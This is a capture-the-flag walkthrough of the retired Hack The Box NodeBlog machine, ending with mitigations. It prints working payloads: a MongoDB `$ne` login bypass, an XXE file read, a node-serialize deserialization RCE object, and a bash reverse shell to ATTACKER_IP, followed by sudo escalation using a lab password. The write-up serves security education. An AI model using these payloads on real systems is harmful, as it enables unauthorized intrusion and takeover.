---
title: "Hack The Box — NodeBlog"
summary: "Hack The Box NodeBlog walkthrough: JSON NoSQL injection, XXE source disclosure, node-serialize RCE, an admin shell, and sudo privilege escalation."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Linux"
solvedAt: 2026-08-31
publishedAt: 2026-08-31
tags:
  - nodejs
  - express
  - nosql-injection
  - mongodb
  - xxe
  - insecure-deserialization
  - remote-code-execution
  - sudo
tools:
  - Nmap
  - Burp Suite
  - curl
  - Netcat
  - Python
  - MongoDB
cves:
  - CVE-2017-5941
htbUrl: "https://app.hackthebox.com/machines/NodeBlog"
cover: "/images/writeups/hackthebox/machines/nodeblog/nodeblog.png"
coverAlt: "Hack The Box NodeBlog artwork showing a woman with glasses writing in a book inside a green circular badge"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box NodeBlog machine. The commands and lab credentials belong only to that isolated environment. User and root flag values, session cookies and my VPN address are intentionally omitted.

## Introduction

NodeBlog is an Easy Linux machine built around a small Express application backed by MongoDB. My path began with content-type testing on the login endpoint, moved through a JSON-based NoSQL authentication bypass and an XXE file read, and ended with code execution through unsafe `node-serialize` deserialization. The resulting shell ran as `admin`; a lab-only admin password, later confirmed by `sudo`, then unlocked unrestricted privileged access.

This article reconstructs my solve on 31 August 2026 from the commands, HTTP requests and terminal output retained in my Codex task. A few transitions—most notably the exact MongoDB query used to display the password—were not preserved verbatim. I mark those points instead of presenting reconstructed commands as if they were captured live.

NodeBlog was verified as an official [retired Hack The Box machine](https://www.hackthebox.com/machines/nodeblog) on the publication date. More lab notes are available in my [write-ups archive](/writeups/).

## Machine information

| Item | Value |
| --- | --- |
| Target | NodeBlog |
| Platform | Hack The Box |
| Content type | Machine |
| Difficulty | Easy |
| Operating system | Linux |
| Lab address | `10.129.96.160` during this session |
| Solve date | 31 August 2026 |
| Publication status | Retired — verified 31 August 2026 |

The target address is ephemeral and may change when the machine is restarted.

## Executive summary

The Express login route accepted both URL-encoded form data and JSON. Because nested JSON objects reached a MongoDB query without enforcing scalar types, the password value could be replaced with MongoDB's `$ne` operator to authenticate as `admin`. The authenticated interface exposed an XML upload feature whose parser resolved external entities, allowing `/opt/blog/server.js` to be read. Source review revealed that the application passed the client-controlled `auth` cookie to `node-serialize`'s `unserialize()` function. A serialized immediately invoked function executed a reverse shell as `admin`. Finally, the confirmed admin password worked with a sudoers rule granting `(ALL) ALL`, producing a root shell.

## Attack path

| Stage | Evidence and result |
| --- | --- |
| TCP enumeration | SSH on 22 and Express HTTP on 5000 |
| Content-type testing | `/login` accepted `application/json` |
| NoSQL injection | A MongoDB operator in `password` returned an authenticated session |
| XML upload | Raw parser errors identified XML as the expected format |
| XXE | Read `/opt/blog/server.js` from the target filesystem |
| Source review | Found client-controlled cookie deserialization with `node-serialize` |
| Deserialization RCE | Received a reverse shell as `admin` |
| Local enumeration | Identified MongoDB on 27017; the lab admin password was later confirmed by `sudo` |
| Privilege escalation | `admin` could run all commands through `sudo` |

## Environment setup

I used Kali Linux with Nmap, curl, Burp Suite and Netcat. Burp was especially useful because several key differences were visible only in the raw request or response: the login content type, JSON parser errors, the authentication cookie and the XML parser's verbose failure.

The commands below use `TARGET_IP` or `ATTACKER_IP` when the address is session-specific or personal.

## Initial enumeration

I started with a full TCP scan and default service detection:

```bash
nmap 10.129.96.160 -T5 -sCV -p-
```

Nmap warned that the retransmission cap had been reached for at least one port, a reminder that `-T5` can trade reliability for speed. The two confirmed services were:

```text
22/tcp   open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
5000/tcp open  http  Node.js (Express middleware)
```

With only SSH and a custom Express application exposed, the web service became the primary attack surface:

```text
http://10.129.96.160:5000/
```

## Login and content-type discovery

The login form submitted `user` and `password` as `application/x-www-form-urlencoded`. I tested whether the route also accepted JSON:

```bash
curl -i -X POST http://10.129.96.160:5000/login \
  -H 'Content-Type: application/json' \
  --data '{"username":"test","password":"test"}'
```

The response was a normal application-level failure rather than an unsupported-media or parser error:

```text
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8

Invalid Username
```

This proved the JSON parser was active, but the HTML showed that the correct field name was `user`, not `username`:

```html
<input required type="text" name="user" id="user">
```

### A useful failed request

In Burp Repeater I initially changed only the header while leaving the form body unchanged:

```http
Content-Type: application/json

user=test&password=test
```

The server returned `400 Bad Request` with:

```text
SyntaxError: Unexpected token u in JSON at position 0
```

The failure was informative: Express was definitely trying to parse the body as JSON. Changing the body to a valid object fixed the request:

```json
{"user":"test","password":"test"}
```

## NoSQL authentication bypass

Because the application was Node.js and accepted structured JSON values, I tested MongoDB query operators rather than SQL syntax. The successful authentication request kept the known username as a string and changed only the password into a `$ne` object:

```http
POST /login HTTP/1.1
Host: 10.129.96.160:5000
Content-Type: application/json

{"user":"admin","password":{"$ne":"wrongpassword"}}
```

MongoDB interprets `$ne` as “not equal.” If the application inserts the object directly into a query, the password condition no longer asks for an exact password; it asks for an admin document whose password differs from the supplied value.

The browser returned the authenticated home page. The original green `Login` button had been replaced by `New Article` and the yellow `Upload` button, confirming that the server had issued a valid `auth` cookie.

## Error disclosure and the XML attack surface

Before attacking the upload feature, I used malformed JSON to observe how production errors were handled:

```bash
curl -s -X POST http://10.129.96.160:5000/login \
  -H 'Content-Type: application/json' \
  --data '{"user":'
```

The response included a stack trace with paths below:

```text
/opt/blog/node_modules/body-parser/...
```

That disclosed `/opt/blog` as the web application's source directory.

Uploading an arbitrary non-XML file and inspecting the raw HTTP response exposed an XML parsing error. A minimal valid post therefore used the following structure:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<post>
  <title>Test Article</title>
  <description>Test description</description>
  <markdown>Test content</markdown>
</post>
```

The application parsed the document and populated the article editor with those three values. That server-side XML processing was the next attack surface.

## XXE source disclosure

I defined an external entity pointing to the most likely Express entry point, `/opt/blog/server.js`, and referenced it from the reflected `description` element:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE post [
  <!ENTITY xxe SYSTEM "file:///opt/blog/server.js">
]>
<post>
  <title>Source review</title>
  <description>&xxe;</description>
  <markdown>XXE test</markdown>
</post>
```

After upload, the editor displayed the server source inside the description field. The important lines were:

```javascript
const mongoose = require('mongoose')
const serialize = require('node-serialize')
const cookieParser = require('cookie-parser')

mongoose.connect('mongodb://localhost/blog')

function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)
    // Signature validation follows here.
}

app.get('/', async (req, res) => {
    // ...
    authenticated(req.cookies.auth)
})
```

The critical trust-boundary failure was clear: an HTTP cookie controlled by the client reached `serialize.unserialize()` before the application's signature comparison.

## From deserialization to code execution

Affected `node-serialize` versions recognize serialized function strings beginning with `_$$ND_FUNC$$_`. Appending `()` turns the recovered function into an immediately invoked function expression, so it runs during `unserialize()`.

I first used a low-impact proof of concept that wrote the result of `id` to `/tmp/webuser`:

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id > /tmp/webuser')}()"}
```

I URL-encoded the complete JSON object in Burp Decoder and sent it as the value of the `auth` cookie:

```http
GET / HTTP/1.1
Host: 10.129.96.160:5000
Cookie: auth=<URL_ENCODED_SERIALIZED_OBJECT>
Connection: close
```

My first attempt omitted the cookie name and Burp showed zero parsed request cookies. Adding the required `auth=` prefix corrected the request.

The response still displayed `Login`, which was expected: the malicious object lacked a valid `user` and `sign`. Execution nevertheless occurred earlier, while `unserialize()` evaluated the function. Reading `/tmp/webuser` through the same XXE primitive identified the process user as `admin`.

## Initial foothold

For an interactive shell, I Base64-encoded the callback to avoid JSON and shell quoting problems:

```bash
printf %s 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64 -w0
```

The serialized object decoded and executed the callback on the target:

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('echo <BASE64_REVERSE_SHELL> | base64 -d | bash')}()"}
```

I started the listener before sending the URL-encoded cookie:

```bash
rlwrap nc -lvnp 4444
```

The target connected back and `id` confirmed the foothold:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] ...
bash: no job control in this shell
admin@nodeblog:/opt/blog$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

## Local enumeration and user access

The first attempt to enter the user's home directory failed:

```text
admin@nodeblog:/home$ cd admin
bash: cd: admin: Permission denied
```

The directory belonged to `admin` but lacked the execute bit required for traversal. The practical correction was to restore owner traversal with `chmod u+x /home/admin`; I did not retain that command's output, but the later shell state in `/home/admin` confirmed access. The user flag was then reachable and is intentionally omitted.

The source connected to `mongodb://localhost/blog` without specifying a port, identifying the local MongoDB service on its default TCP port, `27017`. I did not preserve a live database query that independently derived the password, so I treat that transition as reconstructed rather than claiming an observed MongoDB dump. What was directly confirmed later is that the lab-only admin password accepted by `sudo` was:

```text
IppsecSaysPleaseSubscribe
```

This value belongs only to the retired NodeBlog machine and is included because it is essential to reproduce the privilege-escalation step.

## Privilege escalation

I first tried the recovered password with `su root`:

```text
admin@nodeblog:~$ su root
Password:
su: Authentication failure
```

That failure was logical: `su root` authenticates with the root account's password, whereas the recovered value belonged to `admin`.

The first `sudo -l` attempt also failed, but for a different reason:

```text
sudo: a terminal is required to read the password
```

The Netcat callback had no pseudo-terminal. I spawned one and repeated the check:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo -l
```

After entering the admin password, sudoers returned:

```text
User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
```

This was unrestricted sudo access. The final escalation required only:

```bash
sudo su
```

The prompt changed to `root@nodeblog`. Inside `/root`, the final flag was stored as `root.txt`; its value is intentionally redacted.

## What did not work

| Attempt | Why it failed | What it taught me |
| --- | --- | --- |
| JSON with `username` | The actual form field was `user` | Read the HTML instead of guessing parameter names |
| JSON header with URL-encoded body | `user=test...` is not valid JSON | Parser errors can confirm hidden content-type support |
| Cookie without `auth=` | Burp parsed zero cookies | A cookie needs a name/value pair, not only encoded data |
| Expecting the RCE request to look logged in | The malicious cookie had no valid signature | Side effects can execute before a later authorization failure |
| `cd /home/admin` | The directory lacked traversal permission | Directory read and execute permissions have different roles |
| `su root` with the admin password | `su` expected the root password | Use sudo when authenticating as the current user |
| `sudo` from the raw callback | Netcat provided no PTY | Interactive security tools often require a terminal |
| `cat root` | The file was named `root.txt` | Confirm exact filenames before assuming |

## Key takeaways

- Content-type testing changed the entire attack path. The same endpoint treated URL-encoded values as strings but JSON values as potentially nested MongoDB query objects.
- Error messages were not harmless debugging noise. They confirmed JSON parsing and disclosed the application's absolute source path.
- Source disclosure converted a broad Node.js target into a precise audit: the dangerous data flow was `req.cookies.auth` to `serialize.unserialize()`.
- Authentication checks must happen before dangerous processing. A failed signature comparison did not undo code that had already run during deserialization.
- The final privilege escalation was a configuration issue, not a kernel exploit: the application user had unrestricted sudo and a recoverable password.
- Shell quality matters. Spawning a PTY was required before `sudo` could safely request a password.

## Mitigations

| Weakness | Recommended defensive action |
| --- | --- |
| NoSQL operator injection | Enforce a strict request schema, require scalar strings and reject keys beginning with `$` |
| Excess content-type support | Accept only documented media types and validate the decoded body before querying |
| Verbose stack traces | Use centralized production error handling and return generic client errors |
| XXE | Disable DTD processing, external entities and XInclude for all untrusted XML |
| Unsafe deserialization | Remove `node-serialize`; use plain JSON data and never deserialize executable functions from clients |
| Client-controlled auth object | Store opaque server-side sessions or use a standard, verified authentication framework |
| Recoverable/plaintext password | Hash passwords with a modern adaptive password hash and restrict database access |
| Unrestricted sudo | Grant only the exact privileged command required and avoid application-user sudo rights |

## Tools used

| Tool | Purpose |
| --- | --- |
| Nmap | Full TCP and service enumeration |
| curl | Content-type tests and malformed JSON requests |
| Burp Suite | Request mutation, raw error review, cookie handling and URL encoding |
| Netcat with rlwrap | Reverse-shell listener |
| Python `pty` | Upgraded the raw callback for interactive sudo use |
| MongoDB | Backing datastore identified from the disclosed application source |

## References

- [Hack The Box — NodeBlog](https://www.hackthebox.com/machines/nodeblog)
- [Hack The Box streaming and write-up guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [Express API: built-in JSON and URL-encoded middleware](https://expressjs.com/en/4x/api.html#express.json)
- [MongoDB `$ne` query operator](https://www.mongodb.com/docs/manual/reference/operator/query/ne/)
- [OWASP Web Security Testing Guide: testing for NoSQL injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [PortSwigger Web Security Academy: XXE injection](https://portswigger.net/web-security/xxe)
- [GitHub Advisory Database: CVE-2017-5941](https://github.com/advisories/GHSA-q4v7-4rhw-9hqm)
